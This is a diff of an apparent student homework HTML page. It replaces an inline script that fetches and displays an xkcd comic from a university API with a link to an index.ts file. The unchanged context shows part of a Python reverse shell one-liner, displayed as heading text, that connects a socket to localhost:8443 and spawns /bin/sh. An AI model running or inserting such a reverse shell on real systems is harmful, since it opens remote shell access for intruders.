@@ -122,47 +122,7 @@
             os,pty,socket;s=socket.socket();s.connect(("localhost",8443));[os.dup2(s.fileno(),f)for f
             in(0,1,2)];pty.spawn("/bin/sh")'</h4>
     </div>
-    <script>
-        // Define the email parameter
-const email = 'a.lukianov@innopolis.university';
-
-// Create URLSearchParams object to append the email query parameter
-const params = new URLSearchParams({ email: email });
-
-// Fetch the comic ID
-fetch(`https://fwd.innopolis.university/api/hw2?email=${params.toString()}`)
-    .then(response => response.text())
-    .then(data => {
-        const comicId = data;
-        return fetch(`https://fwd.innopolis.university/api/comic?id=${comicId}`);
-    })
-    .then(response => response.json())
-    .then(comicData => {
-        // Extract comic details
-        const { img, title, alt, year, month, day } = comicData;
-        const date = new Date(year, month - 1, day).toLocaleDateString();
-
-        // Create elements to display the comic
-        const comicDiv = document.getElementById('xkcd');
-
-        const comicImg = document.createElement('img');
-        comicImg.src = img;
-        comicImg.alt = alt;
-
-        const comicTitle = document.createElement('p');
-        comicTitle.textContent = title;
-
-        const comicDate = document.createElement('p');
-        comicDate.textContent = `Published on: ${date}`;
-
-        // Append elements to the comicDiv
-        comicDiv.appendChild(comicTitle);
-        comicDiv.appendChild(comicImg);
-        comicDiv.appendChild(comicDate);
-    })
-    .catch(error => console.error('Error:', error));
-
-    </script>
+    <script src="./index.ts"></script>
 </body>
 
 </html>
